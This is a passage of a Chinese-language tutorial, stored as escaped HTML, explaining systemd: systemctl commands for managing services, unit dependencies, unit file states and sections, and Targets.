class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 立即启动一个服务&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl start apache.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 立即停止一个服务&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl stop apache.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 重启一个服务&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl restart apache.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 杀死一个服务的所有子进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl kill apache.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 重新加载一个服务的配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl reload apache.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 重载所有修改过的配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl daemon-reload&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示某个 Unit 的所有底层参数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl show httpd.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 显示某个 Unit 的指定属性的值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl show -p CPUShares httpd.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 设置某个 Unit 的指定属性&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl set-property httpd.service CPUShares=500&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;依赖关系&quot;&gt;&lt;a href=&quot;#依赖关系&quot; class=&quot;headerlink&quot; title=&quot;依赖关系&quot;&gt;&lt;/a&gt;依赖关系&lt;/h2&gt;&lt;p&gt;Unit 之间存在依赖关系：A 依赖于 B，就意味着 Systemd 在启动 A 的时候，同时会去启动 B。&lt;br&gt;&lt;code&gt;systemctl list-dependencies&lt;/code&gt;命令列出一个 Unit 的所有依赖。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-dependencies nginx.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;上面命令的输出结果之中，有些依赖是 Target 类型（详见下文），默认不会展开显示。如果要展开 Target，就需要使用&lt;code&gt;--all&lt;/code&gt;参数。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-dependencies --all nginx.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;Unit配置文件&quot;&gt;&lt;a href=&quot;#Unit配置文件&quot; class=&quot;headerlink&quot; title=&quot;Unit配置文件&quot;&gt;&lt;/a&gt;Unit配置文件&lt;/h1&gt;&lt;h2 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h2&gt;&lt;p&gt;每一个 Unit 都有一个配置文件，告诉 Systemd 怎么启动这个 Unit 。&lt;br&gt;Systemd 默认从目录/etc/systemd/system/读取配置文件。但是，里面存放的大部分文件都是符号链接，指向目录/usr/lib/systemd/system/，真正的配置文件存放在那个目录。&lt;br&gt;&lt;code&gt;systemctl enable&lt;/code&gt;命令用于在上面两个目录之间，建立符号链接关系。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl enable clamd@scan.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 等同于&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo ln -s &amp;apos;/usr/lib/systemd/system/clamd@scan.service&amp;apos; &amp;apos;/etc/systemd/system/m&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果配置文件里面设置了开机启动，&lt;code&gt;systemctl enable&lt;/code&gt;命令相当于激活开机启动。&lt;br&gt;与之对应的，&lt;code&gt;systemctl disable&lt;/code&gt;命令用于在两个目录之间，撤销符号链接关系，相当于撤销开机启动。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl disable clamd@scan.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;配置文件的后缀名，就是该 Unit 的种类，比如sshd.socket。如果省略，Systemd 默认后缀名为.service，所以sshd会被理解成sshd.service。&lt;/p&gt;
&lt;h2 id=&quot;配置文件的状态&quot;&gt;&lt;a href=&quot;#配置文件的状态&quot; class=&quot;headerlink&quot; title=&quot;配置文件的状态&quot;&gt;&lt;/a&gt;配置文件的状态&lt;/h2&gt;&lt;p&gt;&lt;code&gt;systemctl list-unit-files&lt;/code&gt;命令用于列出所有配置文件。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 列出所有配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-unit-files&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 列出指定类型的配置文件&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-unit-files --type=service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个命令会输出一个列表。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-unit-files&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;UNIT FILE              STATE&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;chronyd.service        enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clamd@.service         static&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;clamd@scan.service     disabled&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个列表显示每个配置文件的状态，一共有四种。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;enabled：已建立启动链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;disabled：没建立启动链接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;static：该配置文件没有[Install]部分（无法执行），只能作为其他配置文件的依赖&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;masked：该配置文件被禁止建立启动链接&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，从配置文件的状态无法看出，该 Unit 是否正在运行。这必须执行前面提到的&lt;code&gt;systemctl status&lt;/code&gt;命令。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl status bluetooth.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;一旦修改配置文件，就要让 SystemD 重新加载配置文件，然后重新启动，否则修改不会生效。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl daemon-reload&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl restart httpd.service&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;配置文件的格式&quot;&gt;&lt;a href=&quot;#配置文件的格式&quot; class=&quot;headerlink&quot; title=&quot;配置文件的格式&quot;&gt;&lt;/a&gt;配置文件的格式&lt;/h2&gt;&lt;p&gt;配置文件就是普通的文本文件，可以用文本编辑器打开。&lt;br&gt;&lt;code&gt;systemctl cat&lt;/code&gt;命令可以查看配置文件的内容。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl cat atd.service&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[Unit]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Description=ATD daemon&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[Service]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type=forking&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecStart=/usr/bin/atd&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[Install]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;WantedBy=multi-user.target&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;从上面的输出可以看到，配置文件分成几个区块。每个区块的第一行，是用方括号表示的区别名，比如[Unit]。注意，配置文件的区块名和字段名，都是大小写敏感的。&lt;br&gt;每个区块内部是一些等号连接的键值对。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[Section]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Directive1=value&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Directive2=value&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;. . .&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意，键值对的等号两侧不能有空格。&lt;/p&gt;
&lt;h2 id=&quot;配置文件的区块&quot;&gt;&lt;a href=&quot;#配置文件的区块&quot; class=&quot;headerlink&quot; title=&quot;配置文件的区块&quot;&gt;&lt;/a&gt;配置文件的区块&lt;/h2&gt;&lt;p&gt;[Unit]区块通常是配置文件的第一个区块，用来定义 Unit 的元数据，以及配置与其他 Unit 的关系。它的主要字段如下。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Description：简短描述&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Documentation：文档地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Requires：当前 Unit 依赖的其他 Unit，如果它们没有运行，当前 Unit 会启动失败&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Wants：与当前 Unit 配合的其他 Unit，如果它们没有运行，当前 Unit 不会启动失败&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;BindsTo：与Requires类似，它指定的 Unit 如果退出，会导致当前 Unit 停止运行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Before：如果该字段指定的 Unit 也要启动，那么必须在当前 Unit 之后启动&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;After：如果该字段指定的 Unit 也要启动，那么必须在当前 Unit 之前启动&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Conflicts：这里指定的 Unit 不能与当前 Unit 同时运行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Condition...：当前 Unit 运行必须满足的条件，否则不会运行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Assert...：当前 Unit 运行必须满足的条件，否则会报启动失败&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;[Install]通常是配置文件的最后一个区块，用来定义如何启动，以及是否开机启动。它的主要字段如下。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;WantedBy：它的值是一个或多个 Target，当前 Unit 激活时（enable）符号链接会放入/etc/systemd/system目录下面以 Target 名 + .wants后缀构成的子目录中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RequiredBy：它的值是一个或多个 Target，当前 Unit 激活时，符号链接会放入/etc/systemd/system目录下面以 Target 名 + .required后缀构成的子目录中&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Alias：当前 Unit 可用于启动的别名&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Also：当前 Unit 激活（enable）时，会被同时激活的其他 Unit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;[Service]区块用来 Service 的配置，只有 Service 类型的 Unit 才有这个区块。它的主要字段如下。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Type：定义启动时的进程行为。它有以下几种值。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type=simple：默认值，执行ExecStart指定的命令，启动主进程&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type=forking：以 fork 方式从父进程创建子进程，创建后父进程会立即退出&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type=oneshot：一次性进程，Systemd 会等当前服务退出，再继续往下执行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type=dbus：当前服务通过D-Bus启动&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type=notify：当前服务启动完毕，会通知Systemd，再继续往下执行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Type=idle：若有其他任务执行完毕，当前服务才会运行&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecStart：启动当前服务的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecStartPre：启动当前服务之前执行的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecStartPost：启动当前服务之后执行的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecReload：重启当前服务时执行的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecStop：停止当前服务时执行的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExecStopPost：停止当其服务之后执行的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;RestartSec：自动重启当前服务间隔的秒数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Restart：定义何种情况 Systemd 会自动重启当前服务，可能的值包括always（总是重启）、on-success、on-failure、on-abnormal、on-abort、on-watchdog&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;TimeoutSec：定义 Systemd 停止当前服务之前等待的秒数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Environment：指定环境变量&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;Unit 配置文件的完整字段清单，请参考&lt;a href=&quot;https://www.freedesktop.org/software/systemd/man/systemd.unit.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;官方文档&lt;/a&gt;。&lt;/p&gt;
&lt;h1 id=&quot;Target&quot;&gt;&lt;a href=&quot;#Target&quot; class=&quot;headerlink&quot; title=&quot;Target&quot;&gt;&lt;/a&gt;Target&lt;/h1&gt;&lt;p&gt;启动计算机的时候，需要启动大量的 Unit。如果每一次启动，都要一一写明本次启动需要哪些 Unit，显然非常不方便。Systemd 的解决方案就是 Target。&lt;br&gt;简单说，Target 就是一个 Unit 组，包含许多相关的 Unit 。启动某个 Target 的时候，Systemd 就会启动里面所有的 Unit。从这个意义上说，Target 这个概念类似于”状态点”，启动某个 Target 就好比启动到某种状态。&lt;br&gt;传统的init启动模式里面，有 RunLevel 的概念，跟 Target 的作用很类似。不同的是，RunLevel 是互斥的，不可能多个 RunLevel 同时启动，但是多个 Target 可以同时启动。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# 查看当前系统的所有 Target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-unit-files --type=target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看一个 Target 包含的所有 Unit&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl list-dependencies multi-user.target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 查看启动时的默认 Target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ systemctl get-default&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# 设置启动时的默认 Target&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;$ sudo systemctl set-default multi-user.target&lt;/span&gt;&lt;br&gt;&lt;span 